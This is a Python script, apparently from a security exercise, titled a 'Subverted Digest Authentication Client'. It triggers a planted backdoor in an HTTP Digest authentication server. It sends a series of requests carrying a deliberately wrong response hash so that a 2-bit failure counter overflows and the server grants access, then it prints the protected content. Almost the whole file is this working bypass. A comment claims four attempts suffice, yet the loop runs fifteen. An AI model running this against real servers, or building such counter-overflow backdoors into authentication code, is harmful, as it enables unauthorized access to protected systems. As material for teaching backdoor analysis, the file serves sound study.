"""
Subverted Digest Authentication Client (2-Bit Overflow Trigger)
Satisfies Requirement R5.
"""
import urllib.request
import urllib.error
import re

def trigger_backdoor(url):
    """Trigger the 2-bit integer overflow by sending consecutive failed attempts."""
    req = urllib.request.Request(url)
    
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as initial_err:
        if initial_err.code == 401:
            print("\n[!] Subverted mode activated")
            username = input("Target Username (must exist on server): ")
            print("[!] Initiating 2-bit integer overflow sequence...")
            
            # Store the current error to extract the changing nonces
            current_err = initial_err
            
            # The 2-bit counter requires exactly 4 iterations to overflow (1, 2, 3, 0)
            for attempt in range(1, 16):
                auth_header = current_err.headers.get("WWW-Authenticate", "")
                match = re.search(r'nonce="([^"]+)"', auth_header)
                
                if match:
                    nonce = match.group(1)
                    
                    req = urllib.request.Request(url)
                    # Send a deliberately bad response hash to trigger the counter
                    malicious_auth = f'Digest username="{username}", nonce="{nonce}", response="deliberately_wrong_hash"'
                    req.add_header("Authorization", malicious_auth)
                    
                    try:
                        resp = urllib.request.urlopen(req)
                        # If we get a 200 OK, the overflow worked!
                        print(f"\n[+] Overflow successful on attempt {attempt}! Status Code: {resp.getcode()} OK")
                        print(resp.read().decode())
                        return
                    except urllib.error.HTTPError as next_err:
                        if next_err.code == 401:
                            print(f"[-] Attempt {attempt} failed (Expected). Server counter incremented.")
                            # Pass the new error object to the next loop iteration to grab the new nonce
                            current_err = next_err 
                        else:
                            print(f"\nUnexpected HTTP Error: {next_err.code}")
                            break
                else:
                    print("\nError: No nonce found in 401 response.")
                    break
        else:
            print(f"\nUnexpected HTTP Error: {initial_err.code}")
    except Exception as ex:
        print(f"\nConnection Error: {ex}")

if __name__ == "__main__":
    target_url = input("Enter server URL (e.g., http://127.0.0.1:8080/): ")
    trigger_backdoor(target_url)